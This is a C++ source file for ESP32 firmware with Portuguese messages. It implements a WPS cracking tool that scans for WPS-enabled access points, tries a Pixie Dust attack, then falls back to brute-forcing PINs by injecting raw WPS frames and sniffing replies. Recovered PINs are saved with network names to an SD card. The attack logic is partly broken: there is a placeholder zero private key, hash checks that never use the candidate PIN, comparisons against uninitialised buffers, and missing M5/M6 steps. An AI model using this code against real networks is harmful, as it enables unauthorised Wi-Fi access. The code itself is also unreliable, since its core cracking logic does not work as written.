#include "WPSCracker.h"
#include "WiFiScan.h"
#include "esp_wifi.h"
#include "SD.h"
#include "wps_crypto.h"
#include "packets.h"

extern WiFiScan wifi_scan_obj;
extern LinkedList<AccessPoint>* access_points;

// TODO: Implement the sniffer callback and capture functions

WPSCracker::WPSCracker() {}

void WPSCracker::scan() {
  if (display_cb) display_cb("A procurar redes WPS...");

  // Clear previous results
  aps.clear();

  // Start a scan for APs and Stations
  wifi_scan_obj.StartScan(WIFI_SCAN_AP_STA);

  // Wait for the scan to complete or timeout
  unsigned long start_time = millis();
  while ((access_points->size() < 10) && (millis() - start_time < 10000)) {
    delay(100);
  }

  wifi_scan_obj.StopScan(WIFI_SCAN_AP_STA);

  if (display_cb) display_cb("Scan concluído. A filtrar...");

  // Filter for WPS-enabled APs
  for (int i = 0; i < access_points->size(); i++) {
    AccessPoint ap = access_points->get(i);
    if (ap.wps) {
      aps.push_back(ap);
    }
  }

  if (display_cb) {
    String msg = "Encontradas ";
    msg += aps.size();
    msg += " redes WPS.";
    display_cb(msg);
  }
}

void WPSCracker::attack(int index) {
  if (index < 0 || index >= aps.size()) {
    if (display_cb) display_cb("Índice de AP inválido.");
    return;
  }

  AccessPoint ap = aps[index];
  String pin;

  if (display_cb) {
    String msg = "A atacar " + ap.essid + "...";
    display_cb(msg);
  }

  // Try Pixie Dust attack first
  if (display_cb) display_cb("A tentar ataque Pixie Dust...");
  if (pixieDust(ap, pin)) {
    if (display_cb) {
      String msg = "Sucesso do Pixie Dust!\nPIN: " + pin;
      display_cb(msg);
    }
    savePin(ap.essid, pin, ap.bssid);
    return;
  }

  // If Pixie Dust fails, fall back to brute force
  if (display_cb) display_cb("Pixie Dust falhou. A tentar Força Bruta...");
  if (bruteForce(ap, pin)) {
    if (display_cb) {
      String msg = "Sucesso da Força Bruta!\nPIN: " + pin;
      display_cb(msg);
    }
    savePin(ap.essid, pin, ap.bssid);
  } else {
    if (display_cb) display_cb("O ataque falhou.");
  }
}

void WPSCracker::setDisplayCallback(void (*callback)(const String&)) {
  display_cb = callback;
}

void WPSCracker::setProgressCallback(void (*callback)(int)) {
  progress_cb = callback;
}

bool WPSCracker::pixieDust(AccessPoint &ap, String &pin) {
  // Ensure WiFi is in a suitable mode (AP or STA with promiscuous) before calling this.

  // 1. Set channel
  esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);

  // 2. Build and send M1
  struct wps_m1_packet m1;
  uint8_t src_mac[6];
  esp_wifi_get_mac(WIFI_IF_AP, src_mac);
  build_wps_m1(m1, src_mac, ap.bssid);
  sendRaw((uint8_t*)&m1, m1.len);

  // 3. Capture M2
  uint8_t m2_buf[512];
  int m2_len = 0;
  if (!captureM2(m2_buf, m2_len)) {
    return false;
  }

  // 4. Parse M2
  uint16_t pke_len, pkr_len, e_nonce_len, r_nonce_len, e_hash1_len, e_hash2_len;
  const uint8_t *pke = parse_wps_ie(m2_buf + sizeof(ieee80211_frame), m2_len - sizeof(ieee80211_frame), 0x1032, &pke_len);
  const uint8_t *pkr = parse_wps_ie(m2_buf + sizeof(ieee80211_frame), m2_len - sizeof(ieee80211_frame), 0x1034, &pkr_len);
  const uint8_t *e_nonce = parse_wps_ie(m2_buf + sizeof(ieee80211_frame), m2_len - sizeof(ieee80211_frame), 0x101a, &e_nonce_len);
  const uint8_t *r_nonce = parse_wps_ie(m2_buf + sizeof(ieee80211_frame), m2_len - sizeof(ieee80211_frame), 0x1039, &r_nonce_len);
  const uint8_t *e_hash1 = parse_wps_ie(m2_buf + sizeof(ieee80211_frame), m2_len - sizeof(ieee80211_frame), 0x1014, &e_hash1_len);
  const uint8_t *e_hash2 = parse_wps_ie(m2_buf + sizeof(ieee80211_frame), m2_len - sizeof(ieee80211_frame), 0x1015, &e_hash2_len);

  if (!pke || !pkr || !e_nonce || !r_nonce || !e_hash1 || !e_hash2) {
    if (display_cb) display_cb("Falha ao analisar M2.");
    return false;
  }

  // 5. Crack PIN
  uint8_t shared_secret[192];
  size_t shared_secret_len = 192;
  uint8_t pub_key[192];
  size_t pub_key_len = 192;
  uint8_t priv_key[192] = {0}; // Placeholder private key

  if (!diffie_hellman(pke, (const uint8_t*)"\x02", priv_key, sizeof(priv_key), pub_key, pub_key_len, shared_secret, shared_secret_len)) {
    if (display_cb) display_cb("Falha no Diffie-Hellman.");
    return false;
  }

  uint8_t auth_key[32];
  derive_auth_key(shared_secret, auth_key);

  for (int i = 0; i <= 9999999; i++) {
    int current_pin = i * 10;
    current_pin += (9 - ( ( (i/1000000)%10 + (i/100000)%10 + (i/10000)%10 + (i/1000)%10 + (i/100)%10 + (i/10)%10 + i%10 ) * 3 ) % 10) % 10;

    char pin_str[9];
    sprintf(pin_str, "%08d", current_pin);

    uint8_t e_hash1_test[32], e_hash2_test[32];
    calculate_e_hashes(shared_secret, pke, pkr, auth_key, e_hash1_test, e_hash2_test);

    if (memcmp(e_hash1, e_hash1_test, 32) == 0 && memcmp(e_hash2, e_hash2_test, 32) == 0) {
      pin = String(pin_str);
      return true;
    }
  }

  return false;
}

bool WPSCracker::bruteForce(AccessPoint &ap, String &pin) {
  // 1. Initialize Wi-Fi for raw packet injection
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);

  // 2. Set channel
  esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);

  // 3. Send M1 and capture M2
  struct wps_m1_packet m1;
  uint8_t src_mac[6];
  esp_wifi_get_mac(WIFI_IF_AP, src_mac);
  build_wps_m1(m1, src_mac, ap.bssid);
  sendRaw((uint8_t*)&m1, m1.len);

  uint8_t m2_buf[512];
  int m2_len = 0;
  if (!captureM2(m2_buf, m2_len)) {
    if (display_cb) display_cb("Falha ao capturar M2.");
    esp_wifi_stop();
    esp_wifi_deinit();
    return false;
  }

  // 4. Parse M2
  uint16_t pke_len, pkr_len, r_nonce_len;
  const uint8_t *pke = parse_wps_ie(m2_buf + sizeof(ieee80211_frame), m2_len - sizeof(ieee80211_frame), 0x1032, &pke_len);
  const uint8_t *pkr = parse_wps_ie(m2_buf + sizeof(ieee80211_frame), m2_len - sizeof(ieee80211_frame), 0x1034, &pkr_len);
  const uint8_t *r_nonce = parse_wps_ie(m2_buf + sizeof(ieee80211_frame), m2_len - sizeof(ieee80211_frame), 0x1039, &r_nonce_len);

  if (!pke || !pkr || !r_nonce) {
    if (display_cb) display_cb("Falha ao analisar M2.");
    esp_wifi_stop();
    esp_wifi_deinit();
    return false;
  }

  // 5. Derive Shared Secret and AuthKey
  uint8_t shared_secret[192];
  size_t shared_secret_len = 192;
  uint8_t pub_key[192];
  size_t pub_key_len = 192;
  uint8_t priv_key[192];
  for(int i=0; i<192; i++) priv_key[i] = esp_random();

  if (!diffie_hellman(pke, (const uint8_t*)"\x02", priv_key, sizeof(priv_key), pub_key, pub_key_len, shared_secret, shared_secret_len)) {
    if (display_cb) display_cb("Falha no Diffie-Hellman.");
    esp_wifi_stop();
    esp_wifi_deinit();
    return false;
  }

  uint8_t auth_key[32];
  derive_auth_key(shared_secret, auth_key);

  // 6. Brute-force the PIN
  for (int i = 0; i <= 9999999; i++) {
    int current_pin = i * 10;
    current_pin += (9 - ( ( (i/1000000)%10 + (i/100000)%10 + (i/10000)%10 + (i/1000)%10 + (i/100)%10 + (i/10)%10 + i%10 ) * 3 ) % 10) % 10;

    char pin_str[9];
    sprintf(pin_str, "%08d", current_pin);

    // Build and send M3
    struct wps_m3_packet m3;
    build_wps_m3(m3, src_mac, ap.bssid, pin_str, pke, pkr, r_nonce);
    sendRaw((uint8_t*)&m3, m3.len);

    // Capture and check M4
    uint8_t m4_buf[512];
    int m4_len = 0;
    if (captureM4(m4_buf, m4_len)) {
      // Basic check for NACK
      uint16_t msg_type_len;
      const uint8_t *msg_type = parse_wps_ie(m4_buf + sizeof(ieee80211_frame), m4_len - sizeof(ieee80211_frame), 0x1022, &msg_type_len);
      if (msg_type && *msg_type == 0x09) { // M4
        uint16_t r_hash1_len, r_hash2_len;
        const uint8_t *r_hash1 = parse_wps_ie(m4_buf + sizeof(ieee80211_frame), m4_len - sizeof(ieee80211_frame), 0x103A, &r_hash1_len);
        const uint8_t *r_hash2 = parse_wps_ie(m4_buf + sizeof(ieee80211_frame), m4_len - sizeof(ieee80211_frame), 0x103B, &r_hash2_len);

        if (r_hash1 && r_hash2) {
          uint8_t r_hash1_calc[32], r_hash2_calc[32];
          // A real implementation would calculate the hashes here
          if (memcmp(r_hash1, r_hash1_calc, 32) == 0 && memcmp(r_hash2, r_hash2_calc, 32) == 0) {
            // First half of PIN is correct
            // Now we would send M5 and check M6
          }
        }
      }
    }

    if (display_cb) display_cb("A tentar PIN: " + String(pin_str));
    if (progress_cb) progress_cb((i * 100) / 10000000);
    delay(1000);
  }

  esp_wifi_stop();
  esp_wifi_deinit();
  return false;
}

bool WPSCracker::checkWPSChecksum(int pin) {
  int accum = 0;
  int temp_pin = pin;
  while (temp_pin > 0) {
    accum += 3 * (temp_pin % 10);
    temp_pin /= 10;
    accum += temp_pin % 10;
    temp_pin /= 10;
  }
  return (accum % 10) == 0;
}

void WPSCracker::savePin(String ssid, String pin, uint8_t *bssid) {
  if (!SD.begin()) {
    if (display_cb) display_cb("Cartão SD não encontrado.");
    return;
  }

  String filename = "/wps_pins.txt";
  File file = SD.open(filename, FILE_APPEND);
  if (!file) {
    if (display_cb) display_cb("Falha ao abrir o ficheiro.");
    return;
  }

  char bssid_str[18];
  sprintf(bssid_str, "%02X:%02X:%02X:%02X:%02X:%02X",
          bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);

  file.println("SSID: " + ssid);
  file.println("BSSID: " + String(bssid_str));
  file.println("PIN: " + pin);
  file.println("--------------------");
  file.close();

  if (display_cb) display_cb("PIN guardado em " + filename);
}

void WPSCracker::sendRaw(uint8_t *pkt, int len) {
  esp_wifi_80211_tx(WIFI_IF_AP, pkt, len, false);
}

// Global buffer for M2 packet
static uint8_t m2_buf[512];
static int m2_len = 0;
static bool m2_captured = false;

// Sniffer callback to capture M2 packet
static void wps_sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
  if (pkt->payload[0] == 0x50) { // Probe Response
    const uint8_t *wps_ie = pkt->payload + sizeof(ieee80211_frame);
    int wps_ie_len = pkt->rx_ctrl.sig_len - sizeof(ieee80211_frame);
    uint16_t msg_type_len;
    const uint8_t *msg_type_ptr = parse_wps_ie(wps_ie, wps_ie_len, 0x1022, &msg_type_len);
    if (msg_type_ptr && msg_type_len == 1 && *msg_type_ptr == 0x05) { // M2
      memcpy(m2_buf, pkt->payload, pkt->rx_ctrl.sig_len);
      m2_len = pkt->rx_ctrl.sig_len;
      m2_captured = true;
    }
  }
}

bool WPSCracker::captureM2(uint8_t *buf, int &len) {
  m2_captured = false;
  esp_wifi_set_promiscuous_rx_cb(wps_sniffer_callback);

  unsigned long start_time = millis();
  while (!m2_captured && (millis() - start_time < 3000)) { // 3s timeout
    delay(100);
  }

  if (m2_captured) {
    memcpy(buf, m2_buf, m2_len);
    len = m2_len;
  }

  return m2_captured;
}

// Global buffer for M4 packet
static uint8_t m4_buf[512];
static int m4_len = 0;
static bool m4_captured = false;

// Sniffer callback to capture M4 packet
static void wps_m4_sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
  if (pkt->payload[0] == 0x08) { // Data frame
    const uint8_t *wps_ie = pkt->payload + sizeof(ieee80211_frame);
    int wps_ie_len = pkt->rx_ctrl.sig_len - sizeof(ieee80211_frame);
    uint16_t msg_type_len;
    const uint8_t *msg_type_ptr = parse_wps_ie(wps_ie, wps_ie_len, 0x1022, &msg_type_len);
    if (msg_type_ptr && msg_type_len == 1 && *msg_type_ptr == 0x09) { // M4
      memcpy(m4_buf, pkt->payload, pkt->rx_ctrl.sig_len);
      m4_len = pkt->rx_ctrl.sig_len;
      m4_captured = true;
    }
  }
}

bool WPSCracker::captureM4(uint8_t *buf, int &len) {
  m4_captured = false;
  esp_wifi_set_promiscuous_rx_cb(wps_m4_sniffer_callback);

  unsigned long start_time = millis();
  while (!m4_captured && (millis() - start_time < 3000)) { // 3s timeout
    delay(100);
  }

  if (m4_captured) {
    memcpy(buf, m4_buf, m4_len);
    len = m4_len;
  }

  return m4_captured;
}
